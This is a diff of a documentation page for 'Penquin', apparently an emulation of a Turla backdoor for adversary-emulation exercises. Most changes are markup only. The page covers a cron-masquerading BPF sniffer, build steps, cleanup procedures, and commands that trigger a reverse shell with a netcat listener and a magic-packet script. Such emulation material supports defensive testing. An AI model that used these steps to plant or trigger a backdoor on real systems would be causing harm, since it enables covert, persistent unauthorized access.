@@ -7,7 +7,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/ael">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.781992544188">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.781992821865">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.6.0">
@@ -35,12 +35,12 @@
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="../../../../favicon.png" rel="icon">
-    <link href="../../../../resources/css/retype.css?v=3.6.0.781992544188" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.6.0.781992821865" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.781992544188" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.781992821865" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.781992544188" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.781992544188" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.781992821865" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.781992821865" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -211,14 +211,39 @@
     </h1>
 </doc-anchor-target>
 <p>Penquin is a backdoor for re-activating access to servers over long term engagements. Penquin installs a BPF filter, mimicing cron, to listen on a servers network interface. When turla sends an activation packet to the targeted host, a reverse shell is activated.</p>
-<p>Penquin is broken into the following components:
-| Component | Description |
-| --- | --- |
-| sniff.c | Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the <a href="https://exatrack.com/public/Tricephalic_Hellkeeper.pdf" class="outbound" target="_blank"><span>ExaTrack Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> |
-| cron.h | A header file containing the byte array of the compiled sniff.c program (generated using the build script (<a href="build_penquin.sh">build_Penquin.sh</a>) |
-| main.c | Writes Penquin to disk, then installs and executes Penquin masquerading as cron |
-| sendPacket.py | Sends an activation packet to a targeted host |
-| crypt.h | Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime |</p>
+<p>Penquin is broken into the following components:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Component</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sniff.c</td>
+<td>Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the <a href="https://exatrack.com/public/Tricephalic_Hellkeeper.pdf" class="outbound" target="_blank"><span>ExaTrack Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>cron.h</td>
+<td>A header file containing the byte array of the compiled sniff.c program (generated using the build script (<a href="build_penquin.sh">build_Penquin.sh</a>)</td>
+</tr>
+<tr>
+<td>main.c</td>
+<td>Writes Penquin to disk, then installs and executes Penquin masquerading as cron</td>
+</tr>
+<tr>
+<td>sendPacket.py</td>
+<td>Sends an activation packet to a targeted host</td>
+</tr>
+<tr>
+<td>crypt.h</td>
+<td>Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime</td>
+</tr>
+</tbody>
+</table>
+</div>
 <br/>
 <doc-anchor-target id="usage-example---manual-execution">
     <h2>
@@ -229,12 +254,12 @@
 <hr>
 <p>This assumes you are running as root on the target Ubuntu system.</p>
 <ol>
-<li>From the  <code v-pre>/root/</code> folder, execute <code v-pre>penquin</code>. Total time 8 seconds to execute. There is no expected terminal output.
+<li><p>From the  <code v-pre>/root/</code> folder, execute <code v-pre>penquin</code>. Total time 8 seconds to execute. There is no expected terminal output.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">./hsperfdata</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Remove <code v-pre>penquin</code> from disk.
+<li><p>Remove <code v-pre>penquin</code> from disk.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">rm hsperfdata</code></pre>
 </doc-codeblock></div>
@@ -295,7 +320,7 @@ Main PID: 88494 (cron)
 <p><code v-pre>p_raw</code> is where our evil cron is listening.</p>
 <p>Results should look like...</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">p_raw   UNCONN  0   0   *:eth0  *   users:((&quot;cron&quot;,pid=1071197,fd=3))            </code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">p_raw   UNCONN  0   0   *:eth0  *   users:((&quot;cron&quot;,pid=1071197,fd=3))</code></pre>
 </doc-codeblock></div>
 </li>
 </ol>
@@ -316,23 +341,25 @@ Main PID: 88494 (cron)
 </doc-anchor-target>
 <p>These steps assume sniff.c(compiled) is already running on the victim host. On the attacker host, start a listener and execute this script. This script sends a crafted packet to the victim host activating a reverse shell connecting to the listener.</p>
 <ol>
-<li>Install all <a href="requirements.txt">requirements</a>
+<li><p>Install all <a href="requirements.txt">requirements</a></p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">pip install -r requirements.txt</code></pre>
 </doc-codeblock></div>
 </li>
-<li>In a terminal window, set up a <code v-pre>netcat</code> listener. Using <code v-pre>8081</code> ensures we are not conflicting with other listeners in this scenario.
+<li><p>In a terminal window, set up a <code v-pre>netcat</code> listener. Using <code v-pre>8081</code> ensures we are not conflicting with other listeners in this scenario.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">nc -lvvp 8081</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Open a second terminal window and navigate to the <code v-pre>/turla/Resources/Penquin</code> directory. Execute the <code v-pre>sendPacket.py</code> script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port <code v-pre>8080</code> is used based on <a href="https://lab52.io/blog/looking-for-penquins-in-the-wild/" class="outbound" target="_blank"><span>Lab52&#x27;s report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.
+<li><p>Open a second terminal window and navigate to the <code v-pre>/turla/Resources/Penquin</code> directory. Execute the <code v-pre>sendPacket.py</code> script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port <code v-pre>8080</code> is used based on <a href="https://lab52.io/blog/looking-for-penquins-in-the-wild/" class="outbound" target="_blank"><span>Lab52&#x27;s report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">sudo -E python3 sendPacket.py --handler_ip 10.0.2.8 --handler_port 8081 --target_ip 10.0.1.6 --target_port 8080 --payload_type base64</code></pre>
 </doc-codeblock></div>
 </li>
-<li>You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output <code v-pre>Sent 1 packets</code> confirms the packet was successfully sent.</li>
-<li>Check the terminal window with the netcat listener, the reverse shell should be running inside the victim&#x27;s <code v-pre>/root</code> directory.</li>
+<li><p>You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output <code v-pre>Sent 1 packets</code> confirms the packet was successfully sent.</p>
+</li>
+<li><p>Check the terminal window with the netcat listener, the reverse shell should be running inside the victim&#x27;s <code v-pre>/root</code> directory.</p>
+</li>
 </ol>
 <blockquote>
 <doc-anchor-target id="magic-packet-context">
@@ -376,21 +403,21 @@ Main PID: 88494 (cron)
 </ol>
 <br/>
 <ol>
-<li>Navigate to the <code v-pre>/Resources/Penquin/</code> folder
+<li><p>Navigate to the <code v-pre>/Resources/Penquin/</code> folder</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">cd /Resources/Penquin/</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Verify the <code v-pre>build_Penquin.sh</code> exists in the folder with executable permissions.
+<li><p>Verify the <code v-pre>build_Penquin.sh</code> exists in the folder with executable permissions.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">ls -lart build_Penquin.sh</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Execute the build script (<a href="build_penquin.sh">build_Penquin.sh</a>).
+<li><p>Execute the build script (<a href="build_penquin.sh">build_Penquin.sh</a>).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">./build_Penquin.sh</code></pre>
 </doc-codeblock></div>
-Results should look like the following:
+<p>Results should look like the following:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">Compiling the sniffer...
 ✔ ./sniff.c exists
@@ -399,11 +426,11 @@ Results should look like the following:
 Success! Sniffer compiled as cron.
 
 Converting sniffer to a header file...
-✔ Success: 
+✔ Success:
 ✔ ./cron.h exists
 Inserting external variable into header file...
-✔ Success: 
-✔ Success: 
+✔ Success:
+✔ Success:
 Success! Header file modified.
 
 Compiling penquin &amp; the embeding the header file...
@@ -427,7 +454,8 @@ Clean up complete
 PATH to binary: /path/to/Penquin/binary/hsperfdata</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output.</li>
+<li><p>Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output.</p>
+</li>
 </ol>
 <p>Context on <code v-pre>cron</code> utility usage: Based on <a href="http://www.muppetlabs.com/%7Ebreadbox/software/tiny/teensy.html" class="outbound" target="_blank"><span>reference article</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
 <ul>
@@ -478,11 +506,11 @@ Setting up installation....
 
 ✔ Success: cp ./hsperfdata /root/hsperfdata
 Archive:  hsperfdata
-inflating: hsperfdata              
+inflating: hsperfdata
 ✔ Success: ./execution_penquin_test.sh
 Test 1 Success! /root/hsperfdata exists &amp; has executable permissions
 Executing...(for 8 seconds)...
-✔ Success: 
+✔ Success:
 =========================================================
 [Test 1]: Installation Check
 =========================================================
@@ -521,17 +549,17 @@ Test 4 Success! A raw socket is running with cron active
 <li>Requires <code v-pre>sudo</code> privileges</li>
 </ul>
 <ol>
-<li>Navigate to the <code v-pre>/Resources/cleanup/Penquin/</code> folder
+<li><p>Navigate to the <code v-pre>/Resources/cleanup/Penquin/</code> folder</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">cd /Resources/cleanup/Penquin/</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Verify the cleanup_penquin.sh exists in the folder with executable permissions.
+<li><p>Verify the cleanup_penquin.sh exists in the folder with executable permissions.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">ls -lart cleanup_penquin.sh</code></pre>
 </doc-codeblock></div>
 </li>
-<li>With <code v-pre>sudo</code>, Execute the following command in the <code v-pre>/Resources/cleanup/Penquin/</code> folder.
+<li><p>With <code v-pre>sudo</code>, Execute the following command in the <code v-pre>/Resources/cleanup/Penquin/</code> folder.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">sudo ./clean_penquin.sh</code></pre>
 </doc-codeblock></div>
@@ -553,14 +581,14 @@ Destroying all the Penquins...</p>
 ✔ /etc/systemd/system/cron.service does not exist
 
 Killing the cron processes...
-Cron is running under PGID: 698039 
+Cron is running under PGID: 698039
 ✔ Success: kill -- -698039
-Test  Success! Verified all proesses associated with the group id 
+Test  Success! Verified all proesses associated with the group id
 
 Resetting the cron service (takes 3 seconds)...
-✔ Success: 
+✔ Success:
 cron is NOT running
-✔ Success: 
+✔ Success:
 ✔ Success: systemctl start cron
 cron is running
 *********************     Host Reset Complete    *********************
@@ -610,21 +638,21 @@ cron is running
 </doc-anchor-target>
 <hr>
 <ol>
-<li>Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them.
+<li><p>Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">ps -efj | grep cron</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the <code v-pre>PGID</code> placeholder in the below command. After executing, the entire process tree should be killed. Verify with <code v-pre>ps -efj | grep cron</code> command or <code v-pre>ps -Hlwwfe</code>. :ax: (i.e. <code v-pre>kill -- -252557</code>)
+<li><p>Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the <code v-pre>PGID</code> placeholder in the below command. After executing, the entire process tree should be killed. Verify with <code v-pre>ps -efj | grep cron</code> command or <code v-pre>ps -Hlwwfe</code>. :ax: (i.e. <code v-pre>kill -- -252557</code>)</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">kill -- -PGID</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running.
+<li><p>Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">systemctl status cron</code></pre>
 </doc-codeblock></div>
-The status message should resemble the below blurb:
+<p>The status message should resemble the below blurb:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; disabled; vendor preset: enabled)
